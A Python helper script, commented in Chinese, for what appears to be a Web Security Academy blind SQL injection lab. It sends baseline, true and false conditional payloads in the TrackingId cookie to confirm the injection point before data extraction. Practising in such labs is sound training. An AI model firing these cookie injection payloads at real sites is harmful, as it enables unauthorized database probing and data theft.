#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
盲注自检脚本 —— 先确认「真/假」两种 cookie 在服务端到底有没有差别。
浏览器 Console 改 cookie 常常被截断（空格/引号），用这个脚本绕开浏览器，直接看服务端反应。

用法：
  1. 填 BASE 和 TRACK_ID（你 lab 首页 DevTools → Application → Cookies 里的 TrackingId）
  2. python scripts/diag_cookie.py
"""
import sys
import urllib.error
import urllib.request

BASE = "https://0aa80060032de95e829e6554007c00c4.web-security-academy.net/"
TRACK_ID = "a1w5Y40o14tSprjP"
MARKER = "Welcome back"
TIMEOUT = 20


def probe(raw_cookie: str):
    """返回 (状态码, 页面里是否有 MARKER, 响应长度)"""
    req = urllib.request.Request(
        BASE + "/",
        headers={"Cookie": raw_cookie, "User-Agent": "diag-cookie/1.0"},
    )
    try:
        resp = urllib.request.urlopen(req, timeout=TIMEOUT)
        body = resp.read().decode("utf-8", "ignore")
        code = resp.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "ignore")
        code = e.code
    except Exception as e:                                  # 网络类错误单独报出来
        return f"ERROR {type(e).__name__}: {e}", None, None
    return code, MARKER in body, len(body)


def main() -> int:
    if "PASTE_ORIGINAL" in TRACK_ID or "0a00xx" in BASE:
        print("先把 BASE 和 TRACK_ID 改掉")
        return 2

    tests = [
        ("原样（基准）", f"TrackingId={TRACK_ID}"),
        ("真条件  ' AND '1'='1", f"TrackingId={TRACK_ID}' AND '1'='1"),
        ("假条件  ' AND '1'='2", f"TrackingId={TRACK_ID}' AND '1'='2"),
    ]

    print(f"{'用例':<24}{'状态码':<8}{'有 Welcome back':<18}响应长度")
    print("-" * 62)
    results = {}
    for name, cookie in tests:
        code, has, size = probe(cookie)
        results[name] = (code, has)
        print(f"{name:<24}{str(code):<8}{str(has):<18}{size}")

    print()
    base = results["原样（基准）"]
    true_ = results["真条件  ' AND '1'='1"]
    false_ = results["假条件  ' AND '1'='2"]

    if base[1] is False:
        print("✗ 基准就没有 Welcome back —— TrackingId 不是有效的（可能被你改坏了）。")
        print("  处理：清掉 cookie → 重新打开 lab 首页拿新的 TrackingId → 先正常访问一次首页。")
    elif true_[1] and not false_[1]:
        print("✓ 注入点确认：真假条件在服务端有差别，可以开始用二分挖数据。")
    elif true_[1] and false_[1]:
        print("✗ 真假都一样 —— 说明引号没进 SQL（多被截断/转义）。检查基准 cookie 是否含空格。")
    else:
        print("! 结果不典型，把上面三行贴给助教看。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
